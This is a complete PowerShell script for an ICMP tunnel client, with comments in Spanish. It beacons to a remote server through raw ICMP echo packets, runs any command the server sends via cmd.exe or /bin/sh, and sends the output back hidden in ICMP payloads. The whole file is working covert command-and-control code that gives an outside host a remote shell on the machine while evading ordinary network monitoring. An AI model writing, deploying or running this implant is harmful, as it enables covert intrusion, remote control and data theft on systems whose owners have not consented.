# =============================================
#   Cliente ICMP Tunnel - PowerShell (Linux/Windows)
# =============================================

param(
    [string]$ServerIP = $env:SERVER_IP,
    [string]$ClientID = $env:CLIENT_ID,
    [int]$HeartbeatInterval = 5
)

if (-not $ServerIP -or -not $ClientID) {
    Write-Host "Uso: .\cliente_icmp.ps1 -ServerIP <ip> -ClientID <id>"
    exit 1
}

# ─────────────────────────────────────────────
# Constantes
# ─────────────────────────────────────────────

[int]$CLIENT_MAGIC = 0xCAFE
[int]$SERVER_MAGIC = 0xBEEF

$HEARTBEAT_PREFIX  = [System.Text.Encoding]::UTF8.GetBytes("HB:")
$MSG_OK            = [System.Text.Encoding]::UTF8.GetBytes("OK")
$MSG_CMD           = [System.Text.Encoding]::UTF8.GetBytes("CMD:")
$MSG_RESULT        = [System.Text.Encoding]::UTF8.GetBytes("RESULT:")

[int]$RESULT_CHUNK_SIZE = 800
[int]$SOCKET_TIMEOUT_MS = 6000
[int]$SEQ = 1

# ─────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────

function Concat-Bytes {
    param([byte[][]]$Arrays)

    $total = 0
    foreach ($a in $Arrays) { $total += $a.Length }

    $result = New-Object byte[] $total
    $offset = 0

    foreach ($a in $Arrays) {
        [System.Buffer]::BlockCopy($a,0,$result,$offset,$a.Length)
        $offset += $a.Length
    }

    return $result
}

function Starts-With {
    param([byte[]]$Data,[byte[]]$Prefix)

    if ($Data.Length -lt $Prefix.Length) { return $false }

    for ($i=0;$i -lt $Prefix.Length;$i++) {
        if ([byte]$Data[$i] -ne [byte]$Prefix[$i]) { return $false }
    }

    return $true
}

function Bytes-Equal {
    param([byte[]]$A,[byte[]]$B)

    if ($A.Length -ne $B.Length) { return $false }

    for ($i=0;$i -lt $A.Length;$i++) {
        if ([byte]$A[$i] -ne [byte]$B[$i]) { return $false }
    }

    return $true
}

# ─────────────────────────────────────────────
# Checksum
# ─────────────────────────────────────────────

function Get-Checksum {
    param([byte[]]$Data)

    [int]$sum = 0
    [int]$i = 0

    while ($i -lt ($Data.Length - 1)) {

        $b1 = [int]$Data[$i]
        $b2 = [int]$Data[$i+1]

        $sum += ($b2 -shl 8) -bor $b1
        $i += 2
    }

    if ($Data.Length % 2 -eq 1) {
        $sum += [int]$Data[$Data.Length-1]
    }

    $sum = ($sum -shr 16) + ($sum -band 0xFFFF)
    $sum += ($sum -shr 16)

    return ((-bnot $sum) -band 0xFFFF)
}

# ─────────────────────────────────────────────
# Build ICMP
# ─────────────────────────────────────────────

function Build-Request {
    param([byte[]]$Payload)

    $seq = $script:SEQ
    $script:SEQ++

    $hdr = New-Object byte[] 8

    $hdr[0] = 8
    $hdr[1] = 0

    $hdr[4] = ($CLIENT_MAGIC -shr 8) -band 0xFF
    $hdr[5] = $CLIENT_MAGIC -band 0xFF

    $hdr[6] = ($seq -shr 8) -band 0xFF
    $hdr[7] = $seq -band 0xFF

    $raw = Concat-Bytes @($hdr,$Payload)

    $ck = Get-Checksum $raw

    $hdr[2] = ($ck -shr 8) -band 0xFF
    $hdr[3] = $ck -band 0xFF

    return Concat-Bytes @($hdr,$Payload)
}

# ─────────────────────────────────────────────
# Parse Reply
# ─────────────────────────────────────────────

function Parse-Reply {
    param([byte[]]$Packet)

    if ($Packet.Length -lt 20) { return $null }

    $first = [int]$Packet[0]
    $ipHLen = ($first -band 0x0F) * 4

    if ($Packet.Length -lt ($ipHLen + 8)) { return $null }

    $icmpLen = $Packet.Length - $ipHLen
    $icmp = New-Object byte[] $icmpLen

    [System.Buffer]::BlockCopy($Packet,$ipHLen,$icmp,0,$icmpLen)

    $type = [int]$icmp[0]

    $pid = (([int]$icmp[4] -shl 8) -bor ([int]$icmp[5]))

    if ($type -ne 0) { return $null }
    if ($pid -ne $SERVER_MAGIC) { return $null }

    if ($icmp.Length -le 8) {
        return [byte[]]@()
    }

    $dataLen = $icmp.Length - 8
    $data = New-Object byte[] $dataLen

    [System.Buffer]::BlockCopy($icmp,8,$data,0,$dataLen)

    return $data
}

# ─────────────────────────────────────────────
# Send and Receive
# ─────────────────────────────────────────────

function Send-And-Recv {

    param(
        [System.Net.Sockets.Socket]$Sock,
        [byte[]]$Payload,
        [int]$TimeoutMs
    )

    $pkt = Build-Request $Payload

    $ip = $null
    try {
      $ip = [System.Net.IPAddress]::Parse($ServerIP)
    }
    catch {
      $ip = [System.Net.Dns]::GetHostAddresses($ServerIP)[0]
    }

    $ep = [System.Net.IPEndPoint]::new($ip,0)


    $Sock.SendTo($pkt,$ep) | Out-Null

    $buf = New-Object byte[] 65535

    $remote = [System.Net.EndPoint](
        [System.Net.IPEndPoint]::new(
            [System.Net.IPAddress]::Any,0))

    $Sock.ReceiveTimeout = $TimeoutMs

    try {

        $n = $Sock.ReceiveFrom($buf,[ref]$remote)

        if ($n -le 0) { return $null }

        $packet = New-Object byte[] $n

        [System.Buffer]::BlockCopy($buf,0,$packet,0,$n)

        return Parse-Reply $packet
    }
    catch {
        return $null
    }
}

# ─────────────────────────────────────────────
# Execute command
# ─────────────────────────────────────────────

function Invoke-Command-Local {

    param([string]$Command)

    try {

        if ($IsWindows) {
            $result = cmd.exe /c $Command 2>&1
        }
        else {
            $result = /bin/sh -c $Command 2>&1
        }

        if ($result) {
            return ($result -join "`n")
        }

        return "(sin salida)"
    }
    catch {
        return "[ERROR] $_"
    }
}

# ─────────────────────────────────────────────
# Send Result
# ─────────────────────────────────────────────

function Send-Result {

    param(
        [System.Net.Sockets.Socket]$Sock,
        [string]$Result
    )

    $data = [System.Text.Encoding]::UTF8.GetBytes($Result)
    $idPrefix = [System.Text.Encoding]::UTF8.GetBytes($ClientID + ":")

    $i = 0

    while ($i -lt $data.Length) {

        $len = [Math]::Min($RESULT_CHUNK_SIZE,$data.Length-$i)

        $chunk = New-Object byte[] $len
        [System.Buffer]::BlockCopy($data,$i,$chunk,0,$len)

        $payload = Concat-Bytes @($MSG_RESULT,$idPrefix,$chunk)

        Write-Host "Enviando heartbeat a $ServerIP"

        Send-And-Recv $Sock $payload 8000 | Out-Null

        $i += $len
    }
}

# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────

Write-Host "============================================="
Write-Host " Cliente ICMP Tunnel PowerShell"
Write-Host "============================================="
Write-Host "Servidor : $ServerIP"
Write-Host "Cliente  : $ClientID"
Write-Host ""

try {

    $sock = [System.Net.Sockets.Socket]::new(
        [System.Net.Sockets.AddressFamily]::InterNetwork,
        [System.Net.Sockets.SocketType]::Raw,
        [System.Net.Sockets.ProtocolType]::Icmp
    )
}
catch {
    Write-Host "Error creando socket RAW"
    exit 1
}

$hbPayload = Concat-Bytes @(
    $HEARTBEAT_PREFIX,
    [System.Text.Encoding]::UTF8.GetBytes($ClientID)
)

while ($true) {

    Write-Host -NoNewline "."

    $reply = Send-And-Recv $sock $hbPayload $SOCKET_TIMEOUT_MS

    if ($null -eq $reply) {
        Start-Sleep $HeartbeatInterval
        continue
    }

    if (Bytes-Equal $reply $MSG_OK) {
        Start-Sleep $HeartbeatInterval
        continue
    }

    if (Starts-With $reply $MSG_CMD) {

        $len = $reply.Length - $MSG_CMD.Length

        $cmdBytes = New-Object byte[] $len
        [System.Buffer]::BlockCopy(
            $reply,
            $MSG_CMD.Length,
            $cmdBytes,
            0,
            $len
        )

        $cmd = [System.Text.Encoding]::UTF8.GetString($cmdBytes)

        Write-Host "`nCMD -> $cmd"

        $out = Invoke-Command-Local $cmd

        Write-Host $out

        Send-Result $sock $out
    }

    Start-Sleep $HeartbeatInterval
}